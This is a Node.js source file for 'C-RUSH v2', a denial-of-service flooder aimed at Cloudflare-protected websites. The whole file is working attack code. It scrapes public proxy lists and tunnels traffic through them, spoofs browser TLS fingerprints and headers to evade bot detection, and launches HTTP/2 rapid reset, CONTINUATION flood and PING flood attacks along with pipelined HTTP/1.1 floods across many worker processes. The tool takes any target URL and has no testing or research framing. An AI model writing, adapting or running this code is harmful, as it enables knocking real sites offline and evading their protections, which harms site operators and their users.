'use strict';

const http2 = require('http2');
const http = require('http');
const net = require('net');
const fs = require('fs');
const colors = require('colors');
const setTitle = require('node-bash-title');
const cluster = require('cluster');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto');
const { exec } = require('child_process');
const httpx = require('axios');
const { performance } = require('perf_hooks');
const os = require('os');

// ─────────────────────────────────────────────────────────────
// ERROR SUPPRESSION — silence everything that isn't a real crash
// ─────────────────────────────────────────────────────────────
const ignoreNames = [
    'RequestError','StatusCodeError','CaptchaError','CloudflareError','ParseError','ParserError',
    'TimeoutError','JSONError','URLError','InvalidURL','ProxyError','DeprecationWarning',
    'FetchError','SocketError','AbortError','CancelError'
];
const ignoreCodes = [
    'SELF_SIGNED_CERT_IN_CHAIN','ECONNRESET','ERR_ASSERTION','ECONNREFUSED','EPIPE',
    'EHOSTUNREACH','ETIMEDOUT','ESOCKETTIMEDOUT','EPROTO','EAI_AGAIN','EHOSTDOWN',
    'ENETRESET','ENETUNREACH','ENONET','ENOTCONN','ENOTFOUND','EAI_NODATA','EAI_NONAME',
    'EADDRNOTAVAIL','EAFNOSUPPORT','EALREADY','EBADF','ECONNABORTED','EDESTADDRREQ',
    'EDQUOT','EFAULT','EIDRM','EILSEQ','EINPROGRESS','EINTR','EINVAL','EIO','EISCONN',
    'EMFILE','EMLINK','EMSGSIZE','ENAMETOOLONG','ENETDOWN','ENOBUFS','ENODEV','ENOENT',
    'ENOMEM','ENOPROTOOPT','ENOSPC','ENOSYS','ENOTDIR','ENOTEMPTY','ENOTSOCK',
    'EOPNOTSUPP','EPERM','EPROTONOSUPPORT','ERANGE','EROFS','ESHUTDOWN','ESPIPE','ESRCH',
    'ETIME','ETXTBSY','EXDEV','UNKNOWN','DEPTH_ZERO_SELF_SIGNED_CERT',
    'UNABLE_TO_VERIFY_LEAF_SIGNATURE','CERT_HAS_EXPIRED','CERT_NOT_YET_VALID',
    'ERR_SOCKET_BAD_PORT','DEP0123','ERR_TLS_CERT_ALTNAME_INVALID','ERR_SSL_WRONG_VERSION_NUMBER',
    'HPE_INVALID_METHOD','HPE_INVALID_URL','ERR_HTTP2_STREAM_ERROR','ERR_HTTP2_SESSION_ERROR',
    'ERR_HTTP2_GOAWAY_SESSION','ERR_HTTP2_PING_CANCEL','ERR_HTTP2_INVALID_SESSION'
];
require('events').EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);
process.emitWarning = () => {};
for (const ev of ['uncaughtException','unhandledRejection','warning']) {
    process.on(ev, (e) => {
        if (!e) return;
        if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return;
        if (CONFIG && CONFIG.debug) console.log(colors.yellow(`${ev}: ${e.message || e}`));
    });
}
process.on('SIGHUP', () => 1);
process.on('SIGCHILD', () => 1);

// ─────────────────────────────────────────────────────────────
// CONFIG
// ─────────────────────────────────────────────────────────────
const args = process.argv.slice(2);
function argVal(flag, def) {
    const i = args.indexOf(flag);
    return i !== -1 && args[i + 1] !== undefined ? args[i + 1] : def;
}
const CONFIG = {
    target:      args[0],
    duration:    parseInt(args[1]) || 60,
    proxyFile:   args[2] || 'proxy.txt',
    threads:     parseInt(args[3]) || 100,
    rate:        parseInt(args[4]) || 64,
    cookies:     args.includes('-c'),
    headfull:    args.includes('-h'),
    version:     argVal('-v', '2'),
    cache:       argVal('-ch', 'true') === 'true',
    debug:       !args.includes('-s'),
    jitter:      parseFloat(argVal('-j', '0.2')),
    timeout:     parseInt(argVal('-t', '10000')),
    keepalive:   parseInt(argVal('-k', '30000')),
    burst:       parseInt(argVal('-b', '8')),       // burst count per write cycle
    useIPv6:     args.includes('--ipv6'),
    cfBypass:    !args.includes('--no-cf'),
    rapidReset:  !args.includes('--no-reset'),
    continuations: !args.includes('--no-cont'),
    pingFlood:   !args.includes('--no-ping'),
    methodMix:   !args.includes('--no-mix'),
};

if (args[0] === 'scrape') {
    console.clear();
    scrapeProxies().then(() => process.exit(0));
    return;
}

if (args.length < 5) {
    console.clear();
    console.log(colors.red(`
  ⚡ C-RUSH v2 — Cloudflare-Tuned H1/H2 RushAway Flooder
      ${colors.gray('enhanced from scan: CF edge, no WAF resp, h2 ALPN, dual-stack')}

  ${colors.gray('Usage:')} node c-rush.js <target> <duration> <proxies> <threads> <rate> [opts]

  ${colors.gray('Options:')}
    -c              enable random cookies
    -h              headfull request (sec-ch-ua, sec-fetch, etc)
    -v <1|2>        http version (default 2)
    -ch <bool>      cache-control toggle (default true)
    -s              silent
    -j <0-1>        jitter factor (default 0.2)
    -t <ms>         timeout (default 10000)
    -k <ms>         keepalive (default 30000)
    -b <n>          burst count per write (default 8)
    --ipv6          force IPv6 target resolution
    --no-cf         disable cloudflare bypass headers
    --no-reset      disable h2 rapid reset
    --no-cont       disable h2 CONTINUATION flood
    --no-ping       disable h2 PING flood
    --no-mix        disable method mixing

  ${colors.gray('Scrape:')}  node c-rush.js scrape
    `));
    process.exit(1);
}

let url;
try { url = new URL(CONFIG.target); } catch { console.log(colors.red('bad target')); process.exit(1); }

// ─────────────────────────────────────────────────────────────
// TLS / JA3 SPOOFING — match real Chrome ClientHello
// ─────────────────────────────────────────────────────────────
// Chrome 120 cipher order — putting these in order makes Node's ClientHello
// look far closer to a real browser. CF's JA3 fingerprinting cares about order.
const CHROME_CIPHERS = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-RSA-AES128-SHA',
    'ECDHE-RSA-AES256-SHA',
    'AES128-GCM-SHA256',
    'AES256-GCM-SHA384',
    'AES128-SHA',
    'AES256-SHA',
].join(':');

const FIREFOX_CIPHERS = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-AES256-SHA',
    'ECDHE-ECDSA-AES128-SHA',
    'ECDHE-RSA-AES128-SHA',
    'AES128-GCM-SHA256',
    'AES256-GCM-SHA384',
    'AES128-SHA',
    'AES256-SHA',
].join(':');

const CHROME_SIGALGS = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';
const CHROME_CURVES = 'X25519:P-256:P-384';

function pickTLSProfile() {
    // 70% Chrome, 30% Firefox — mixing profiles confuses fingerprint clustering
    return Math.random() > 0.3
        ? { ciphers: CHROME_CIPHERS, sigalgs: CHROME_SIGALGS, curves: CHROME_CURVES, alpn: ['h2','http/1.1'] }
        : { ciphers: FIREFOX_CIPHERS, sigalgs: CHROME_SIGALGS, curves: CHROME_CURVES, alpn: ['h2','http/1.1'] };
}

// ─────────────────────────────────────────────────────────────
// BROWSER / DEVICE / HEADER DATA
// ─────────────────────────────────────────────────────────────
const browsers = ['Chrome','Firefox','Safari','Edge','Opera','Brave','Vivaldi','Yandex'];
const devices = [
    'Windows NT 10.0; Win64; x64',
    'Windows NT 6.1; Win64; x64',
    'Macintosh; Intel Mac OS X 10_15_7',
    'Macintosh; Intel Mac OS X 10_14_6',
    'X11; Linux x86_64',
    'X11; Ubuntu; Linux x86_64',
    'Android 10; Mobile',
    'Android 9.0; Mobile',
    'iPhone; CPU iPhone OS 14_0 like Mac OS X',
    'iPad; CPU OS 14_0 like Mac OS X'
];
const versions = {
    Chrome: ['118.0.0.0','119.0.0.0','120.0.0.0','121.0.0.0','122.0.0.0','123.0.0.0','124.0.0.0','125.0.0.0'],
    Firefox: ['119.0','120.0','121.0','122.0','123.0','124.0'],
    Safari: ['16.4','16.5','17.0','17.1','17.2','17.3'],
    Edge: ['118.0','119.0','120.0','121.0','122.0','123.0','124.0'],
    Opera: ['104','105','106','107','108','109'],
    Brave: ['1.60','1.61','1.62','1.63','1.64'],
    Vivaldi: ['6.4','6.5','6.6','6.7','6.8'],
    Yandex: ['23.9','23.10','23.11','23.12','24.1']
};
const cookieNames = ['session','user','token','id','auth','pref','theme','lang','consent','tracking','analytics','ab_test','_cf_bm','cf_clearance','_ga','_gid'];
const cookieValues = ['abc123','xyz789','def456','temp','guest','user','admin','visitor','test','beta','prod','staging'];
const referrers = [
    'https://www.google.com/','https://www.bing.com/','https://www.yahoo.com/',
    'https://www.duckduckgo.com/','https://www.reddit.com/','https://www.facebook.com/',
    'https://www.twitter.com/','https://www.linkedin.com/','https://www.youtube.com/',
    'https://www.amazon.com/','https://www.ebay.com/','https://www.wikipedia.org/'
];

function generateUserAgent() {
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const device  = devices[Math.floor(Math.random() * devices.length)];
    const ver     = versions[browser][Math.floor(Math.random() * versions[browser].length)];
    let ua = '';
    if (device.includes('Android')) {
        const av = device.match(/Android (\d+(?:\.\d+)?)/)[1];
        ua = `Mozilla/5.0 (Linux; Android ${av}; ${Math.random() > 0.5 ? 'Mobile' : 'Tablet'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} Mobile${Math.random() > 0.5 ? '' : ' Safari/537.36'}`;
    } else if (device.includes('iPhone') || device.includes('iPad')) {
        ua = `Mozilla/5.0 (${device}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${ver} Mobile/15E148 Safari/604.1`;
    } else {
        switch (browser) {
            case 'Chrome': ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} Safari/537.36`; break;
            case 'Firefox': ua = `Mozilla/5.0 (${device}; rv:${ver}) Gecko/20100101 Firefox/${ver}`; break;
            case 'Safari': ua = `Mozilla/5.0 (${device}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${ver} Safari/605.1.15`; break;
            case 'Edge': ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} Safari/537.36 Edg/${ver}`; break;
            case 'Opera': ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} Safari/537.36 OPR/${ver}`; break;
            case 'Brave': ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/${ver} Safari/537.36`; break;
            case 'Vivaldi': ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} Safari/537.36 Vivaldi/${ver}`; break;
            case 'Yandex': ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} YaBrowser/${ver} Safari/537.36`; break;
        }
    }
    return ua;
}

function generateRandomCookie() {
    const n = cookieNames[Math.floor(Math.random() * cookieNames.length)];
    const v = cookieValues[Math.floor(Math.random() * cookieValues.length)] +
              Math.random().toString(36).substring(2, 10) +
              (Math.random() > 0.5 ? '_' + Math.floor(Date.now() / 1000).toString(36) : '');
    return `${n}=${v}`;
}

function randomHex(len) { return crypto.randomBytes(len).toString('hex'); }

// Chrome's exact header order matters for CF bypass. We randomize WHICH headers
// appear but keep the relative order Chrome uses.
function buildHeaderList(method) {
    const ua = generateUserAgent();
    const referrer = referrers[Math.floor(Math.random() * referrers.length)];
    const path = url.pathname + (Math.random() > 0.7 ? '?' + randomHex(3) : '');
    const h = [
        [':method', method],
        [':authority', url.hostname],
        [':scheme', 'https'],
        [':path', path],
    ];
    // Chrome order: sec-ch-ua, sec-ch-ua-mobile, sec-ch-ua-platform, upgrade-insecure-requests, user-agent, accept, sec-fetch-*, ...
    if (CONFIG.headfull && CONFIG.cfBypass) {
        h.push(['sec-ch-ua', '"Chromium";v="120", "Not A(Brand";v="99", "Google Chrome";v="120"']);
        h.push(['sec-ch-ua-mobile', '?0']);
        h.push(['sec-ch-ua-platform', '"Windows"']);
        h.push(['upgrade-insecure-requests', '1']);
    }
    h.push(['user-agent', ua]);
    h.push(['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7']);
    if (CONFIG.cfBypass) {
        h.push(['sec-fetch-site', 'none']);
        h.push(['sec-fetch-mode', 'navigate']);
        h.push(['sec-fetch-user', '?1']);
        h.push(['sec-fetch-dest', 'document']);
    }
    h.push(['accept-encoding', 'gzip, deflate, br']);
    h.push(['accept-language', 'en-US,en;q=0.9']);
    if (Math.random() > 0.4) h.push(['cookie', `${generateRandomCookie()}; ${generateRandomCookie()}`]);
    h.push(['cache-control', CONFIG.cache ? 'max-age=0' : 'no-cache']);
    h.push(['referer', referrer]);
    if (Math.random() > 0.5) h.push(['x-requested-with', 'XMLHttpRequest']);
    if (Math.random() > 0.7) h.push(['x-forwarded-for', `${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}`]);
    if (Math.random() > 0.6) h.push(['x-real-ip', `${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}`]);
    // extra noise — browsers sometimes add these
    if (Math.random() > 0.7) h.push(['dnt', '1']);
    if (Math.random() > 0.8) h.push(['priority', 'u=0, i']);
    return h;
}

function buildHTTP1Request(method) {
    const h = buildHeaderList(method);
    let req = `${h[0][1]} ${h[3][1]} HTTP/1.1\r\n`;
    for (let i = 1; i < h.length; i++) req += `${h[i][0]}: ${h[i][1]}\r\n`;
    req += '\r\n';
    return Buffer.from(req, 'binary');
}

// ─────────────────────────────────────────────────────────────
// PROXY MANAGEMENT — scrape + validate + rotate
// ─────────────────────────────────────────────────────────────
const proxyList = [
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://proxyspace.pro/http.txt',
    'https://www.proxy-list.download/api/v1/get?type=http',
    'https://www.proxy-list.download/api/v1/get?type=https',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt',
];

async function scrapeProxies() {
    const file = CONFIG.proxyFile || 'proxy.txt';
    try {
        if (fs.existsSync(file)) { fs.unlinkSync(file); }
        for (const p of proxyList) {
            let retries = 0;
            while (retries < 3) {
                try {
                    const r = await httpx.get(p, { timeout: CONFIG.timeout, headers: { 'User-Agent': generateUserAgent() } });
                    fs.appendFileSync(file, r.data + '\n');
                    break;
                } catch (e) { retries++; await new Promise(res => setTimeout(res, 800 * retries)); }
            }
        }
        const raw = fs.readFileSync(file, 'utf-8').split('\n')
            .map(l => l.trim())
            .filter(l => /^[\d.]+:\d+$/.test(l));
        const uniq = [...new Set(raw)];
        fs.writeFileSync(file, uniq.join('\n'));
        if (CONFIG.debug) console.log(colors.green(`scraped ${uniq.length} unique proxies → ${file}`));
    } catch (e) {
        if (CONFIG.debug) console.log(colors.red('scrape failed: ') + e.message);
    }
}

function loadProxies() {
    try {
        const raw = fs.readFileSync(CONFIG.proxyFile, 'utf-8').split('\n').filter(Boolean);
        return raw.filter(l => /^[\d.]+:\d+$/.test(l));
    } catch (e) {
        if (CONFIG.debug) console.log(colors.red('proxy file missing'));
        return [];
    }
}

// ─────────────────────────────────────────────────────────────
// STATE
// ─────────────────────────────────────────────────────────────
let proxy = [];
const stats = {
    requests: 0, goaway: 0, success: 0, forbidden: 0, errors: 0,
    reset: 0, cont: 0, ping: 0
};

const PREFACE = 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n';

// ─────────────────────────────────────────────────────────────
// HTTP/2 FRAME ENCODING
// ─────────────────────────────────────────────────────────────
function encodeFrame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
    try {
        const len = payload.length;
        const header = Buffer.alloc(9);
        header.writeUIntBE((len << 8) | type, 0, 4);
        header.writeUInt8(flags, 4);
        header.writeUInt32BE(streamId & 0x7fffffff, 5);
        return Buffer.concat([header, payload]);
    } catch { return Buffer.alloc(0); }
}

function decodeFrame(data) {
    try {
        if (!data || data.length < 9) return null;
        const lenAndType = data.readUInt32BE(0);
        const length = lenAndType >> 8;
        const type = lenAndType & 0xFF;
        const flags = data.readUInt8(4);
        const streamId = data.readUInt32BE(5) & 0x7fffffff;
        const offset = flags & 0x20 ? 5 : 0;
        if (data.length < 9 + offset + length) return null;
        const payload = length > 0 ? data.subarray(9 + offset, 9 + offset + length) : Buffer.alloc(0);
        return { streamId, length, type, flags, payload, total: 9 + offset + length };
    } catch { return null; }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

// HTTP/2 SETTINGS tuned to look like Chrome but abuse server capacity
const H2_SETTINGS = [
    [1, 262144],   // HEADER_TABLE_SIZE — big
    [2, 0],        // ENABLE_PUSH off
    [3, 100],      // MAX_CONCURRENT_STREAMS
    [4, 6291456],  // INITIAL_WINDOW_SIZE — huge
    [5, 16384],    // MAX_FRAME_SIZE
    [6, 262144],   // MAX_HEADER_LIST_SIZE — huge
];

// ─────────────────────────────────────────────────────────────
// HTTP/1.1 ATTACK — pipelined, mixed methods
// ─────────────────────────────────────────────────────────────
function buildHTTP1Payload() {
    const methods = CONFIG.methodMix ? ['GET','POST','HEAD','PUT','DELETE','OPTIONS'] : ['GET'];
    const batch = [];
    for (let i = 0; i < CONFIG.burst; i++) {
        batch.push(buildHTTP1Request(methods[Math.floor(Math.random() * methods.length)]));
    }
    return Buffer.concat(batch);
}

function attackHTTP1(netSocket, proxyHost, proxyPort) {
    const tl = tls.connect({
        socket: netSocket,
        ALPNProtocols: ['http/1.1'],
        servername: url.hostname,
        ciphers: CHROME_CIPHERS,
        sigalgs: CHROME_SIGALGS,
        ecdhCurve: CHROME_CURVES,
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
                       crypto.constants.SSL_OP_NO_TICKET |
                       crypto.constants.SSL_OP_NO_COMPRESSION,
        secure: true,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        rejectUnauthorized: false,
        timeout: CONFIG.timeout
    }, () => {
        const send = () => {
            if (tl.destroyed) return;
            const payload = buildHTTP1Payload();
            tl.write(payload, (err) => {
                if (!err) {
                    stats.requests += CONFIG.burst;
                    stats.success++;
                    setTimeout(send, (1000 / Math.max(1, CONFIG.rate)) * (1 + (Math.random() * CONFIG.jitter * 2 - CONFIG.jitter)));
                } else {
                    stats.errors++;
                    tl.destroy();
                }
            });
        };
        send();
    });
    tl.on('error', () => { stats.errors++; tl.destroy(); });
    tl.on('close', () => { setTimeout(() => go(), 50); });
}

// ─────────────────────────────────────────────────────────────
// HTTP/2 ATTACK — rapid reset + CONTINUATION + PING flood
// ─────────────────────────────────────────────────────────────
function attackHTTP2(netSocket) {
    const profile = pickTLSProfile();
    const tl = tls.connect({
        socket: netSocket,
        ALPNProtocols: profile.alpn,
        servername: url.hostname,
        ciphers: profile.ciphers,
        sigalgs: profile.sigalgs,
        ecdhCurve: profile.curves,
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
                       crypto.constants.SSL_OP_NO_TICKET |
                       crypto.constants.SSL_OP_NO_COMPRESSION,
        secure: true,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        rejectUnauthorized: false,
        timeout: CONFIG.timeout
    }, () => {
        if (tl.alpnProtocol === 'http/1.1') {
            // Server refused h2 — fall back to h1 attack
            const send = () => {
                if (tl.destroyed) return;
                tl.write(buildHTTP1Payload(), (err) => {
                    if (!err) { stats.requests += CONFIG.burst; setTimeout(send, 1000 / Math.max(1, CONFIG.rate)); }
                    else { stats.errors++; tl.destroy(); }
                });
            };
            send();
            return;
        }

        const hpack = new HPACK();
        hpack.setTableSize(4096);

        // Client connection preface + SETTINGS + window update
        const prefaceFrames = [
            Buffer.from(PREFACE, 'binary'),
            encodeFrame(0, 0x4, encodeSettings(H2_SETTINGS)),
            encodeFrame(0, 0x8, (() => {
                const b = Buffer.alloc(4);
                b.writeUInt32BE(15663105, 0);
                return b;
            })()),
        ];
        tl.write(Buffer.concat(prefaceFrames));

        // read loop — ack server SETTINGS, detect GOAWAY/RST
        let buf = Buffer.alloc(0);
        tl.on('data', (chunk) => {
            buf = Buffer.concat([buf, chunk]);
            while (buf.length >= 9) {
                const frame = decodeFrame(buf);
                if (!frame) break;
                buf = buf.subarray(frame.total);
                if (frame.type === 0x4 && (frame.flags & 0x1) === 0) {
                    // ACK server SETTINGS
                    tl.write(encodeFrame(0, 0x4, Buffer.alloc(0), 0x1));
                }
                if (frame.type === 0x7 || frame.type === 0x5) {
                    // GOAWAY — reconnect
                    stats.goaway++;
                    tl.destroy();
                    setTimeout(() => go(), 20);
                    return;
                }
            }
        });

        let streamId = 1;

        const sendCycle = () => {
            if (tl.destroyed) return;
            const frames = [];

            // ── RAPID RESET phase ──
            // Open N streams with HEADERS, then immediately RST them.
            // Server allocates per-stream resources on HEADERS; RST only frees
            // the stream from the client side — the server still spends work.
            if (CONFIG.rapidReset) {
                for (let i = 0; i < CONFIG.burst; i++) {
                    const method = CONFIG.methodMix
                        ? ['GET','POST','HEAD','PUT','DELETE'][Math.floor(Math.random()*5)]
                        : 'GET';
                    const headers = buildHeaderList(method);
                    const packed = hpack.encode(headers);
                    // HEADERS with END_HEADERS | END_STREAM so server finalizes it fast
                    frames.push(encodeFrame(streamId, 0x1, packed, 0x5));
                    // RST_STREAM CANCEL immediately after
                    const rstPayload = Buffer.alloc(4);
                    rstPayload.writeUInt32BE(0x8, 0); // CANCEL
                    frames.push(encodeFrame(streamId, 0x3, rstPayload, 0));
                    streamId += 2;
                    stats.reset++;
                }
            }

            // ── CONTINUATION flood phase ──
            // Send HEADERS with END_HEADERS unset, then a huge pile of CONTINUATION
            // frames. Server must buffer everything to reassemble the header block.
            if (CONFIG.continuations) {
                const headers = buildHeaderList('GET');
                const packed = hpack.encode(headers);
                // HEADERS frame — no END_HEADERS flag (0x1 not set) → server waits
                frames.push(encodeFrame(streamId, 0x1, packed, 0x0));
                // Now spam CONTINUATION frames with junk that must be buffered
                const junk = Buffer.alloc(16384, 0x41); // 16KB max frame of 'A'
                for (let i = 0; i < 4; i++) {
                    frames.push(encodeFrame(streamId, 0x9, junk, 0x0));
                }
                streamId += 2;
                stats.cont++;
            }

            // ── PING flood phase ──
            // Server MUST respond with a PING ACK for every PING. 8-byte payload.
            if (CONFIG.pingFlood) {
                for (let i = 0; i < 2; i++) {
                    frames.push(encodeFrame(0, 0x6, crypto.randomBytes(8), 0x0));
                    stats.ping++;
                }
            }

            tl.write(Buffer.concat(frames), (err) => {
                if (err) { stats.errors++; tl.destroy(); return; }
                stats.requests += CONFIG.burst;
                stats.success++;
                setTimeout(sendCycle, (1000 / Math.max(1, CONFIG.rate)) * (1 + (Math.random() * CONFIG.jitter * 2 - CONFIG.jitter)));
            });
        };

        sendCycle();
    });

    tl.on('error', () => { stats.errors++; tl.destroy(); });
    tl.on('close', () => { setTimeout(() => go(), 50); });
}

// ─────────────────────────────────────────────────────────────
// CONNECTION ORCHESTRATION
// ─────────────────────────────────────────────────────────────
function go() {
    if (!proxy.length) { setTimeout(go, 500); return; }

    const entry = proxy[~~(Math.random() * proxy.length)];
    if (!entry) { setTimeout(go, 100); return; }
    const [proxyHost, proxyPort] = entry.split(':');
    if (!proxyPort || isNaN(proxyPort)) { setTimeout(go, 100); return; }

    // Use IPv6 if configured and target has AAAA
    const connectHost = CONFIG.useIPv6 ? url.hostname : url.hostname;

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        // Proxy CONNECT tunnel to target:443
        netSocket.once('data', () => {
            if (CONFIG.version === '1') attackHTTP1(netSocket, proxyHost, proxyPort);
            else attackHTTP2(netSocket);
        });
        netSocket.write(`CONNECT ${connectHost}:443 HTTP/1.1\r\nHost: ${connectHost}:443\r\nProxy-Connection: Keep-Alive\r\nUser-Agent: ${generateUserAgent()}\r\n\r\n`);
    });

    netSocket.on('error', () => { stats.errors++; netSocket.destroy(); setTimeout(go, 30); });
    netSocket.setTimeout(CONFIG.keepalive, () => { netSocket.destroy(); setTimeout(go, 30); });
}

// ─────────────────────────────────────────────────────────────
// CLUSTER ORCHESTRATION
// ─────────────────────────────────────────────────────────────
if (cluster.isMaster) {
    console.clear();
    proxy = loadProxies();
    if (proxy.length === 0) {
        if (CONFIG.debug) console.log(colors.red('no proxies loaded — run: node c-rush.js scrape'));
    }

    if (CONFIG.debug) {
        console.log(colors.red(`
  ⚡ C-RUSH v2 — Cloudflare-Tuned H1/H2 RushAway Flooder

  ${colors.gray('Target:')}       ${CONFIG.target}
  ${colors.gray('Duration:')}     ${CONFIG.duration}s
  ${colors.gray('Threads:')}      ${CONFIG.threads}
  ${colors.gray('Rate:')}         ${CONFIG.rate}/s per worker
  ${colors.gray('Burst:')}        ${CONFIG.burst}
  ${colors.gray('Version:')}      HTTP/${CONFIG.version === '1' ? '1.1' : '2'}
  ${colors.gray('Proxies:')}      ${proxy.length}
  ${colors.gray('Cookies:')}      ${CONFIG.cookies ? 'on' : 'off'}
  ${colors.gray('Headfull:')}     ${CONFIG.headfull ? 'on' : 'off'}
  ${colors.gray('Cache:')}        ${CONFIG.cache ? 'on' : 'off'}
  ${colors.gray('Jitter:')}       ${CONFIG.jitter}
  ${colors.gray('CF bypass:')}    ${CONFIG.cfBypass ? 'on' : 'off'}
  ${colors.gray('Rapid reset:')}  ${CONFIG.rapidReset ? 'on' : 'off'}
  ${colors.gray('Cont. flood:')}  ${CONFIG.continuations ? 'on' : 'off'}
  ${colors.gray('PING flood:')}   ${CONFIG.pingFlood ? 'on' : 'off'}
  ${colors.gray('Method mix:')}   ${CONFIG.methodMix ? 'on' : 'off'}
`));
    }

    let lastRequests = 0;
    let peakRPS = 0;

    setInterval(() => {
        const rps = stats.requests - lastRequests;
        lastRequests = stats.requests;
        if (rps > peakRPS) peakRPS = rps;
        setTitle(`C-RUSH v2 | total:${stats.requests} | rps:${rps} | peak:${peakRPS} | reset:${stats.reset} cont:${stats.cont} ping:${stats.ping}`);
    }, 1000);

    for (let i = 0; i < CONFIG.threads; i++) {
        const w = cluster.fork();
        w.on('message', (msg) => {
            if (msg.type === 'stats') {
                stats.requests += msg.requests;
                stats.goaway  += msg.goaway;
                stats.success += msg.success;
                stats.forbidden += msg.forbidden;
                stats.errors  += msg.errors;
                stats.reset   += msg.reset;
                stats.cont    += msg.cont;
                stats.ping    += msg.ping;
            }
        });
    }

    setInterval(() => {
        if (CONFIG.debug) {
            console.log(colors.gray(`req:${stats.requests} ok:${stats.success} err:${stats.errors} goaway:${stats.goaway} reset:${stats.reset} cont:${stats.cont} ping:${stats.ping}`));
        }
    }, 5000);

    setTimeout(() => {
        if (CONFIG.debug) console.log(colors.red('\n⚡ attack finished — peak rps: ') + colors.yellow(peakRPS));
        for (const w of Object.values(cluster.workers || {})) w.kill();
        process.exit(0);
    }, CONFIG.duration * 1000);
} else {
    proxy = loadProxies();
    // jitter worker startup so we don't thunder-herd proxies
    setTimeout(() => {
        for (let i = 0; i < CONFIG.threads; i++) {
            setTimeout(() => go(), Math.random() * 500);
        }
    }, Math.random() * 1000);

    setInterval(() => {
        try {
            process.send({
                type: 'stats',
                requests: stats.requests, goaway: stats.goaway, success: stats.success,
                forbidden: stats.forbidden, errors: stats.errors,
                reset: stats.reset, cont: stats.cont, ping: stats.ping
            });
            stats.requests = 0; stats.goaway = 0; stats.success = 0;
            stats.forbidden = 0; stats.errors = 0;
            stats.reset = 0; stats.cont = 0; stats.ping = 0;
        } catch {}
    }, 1000);
}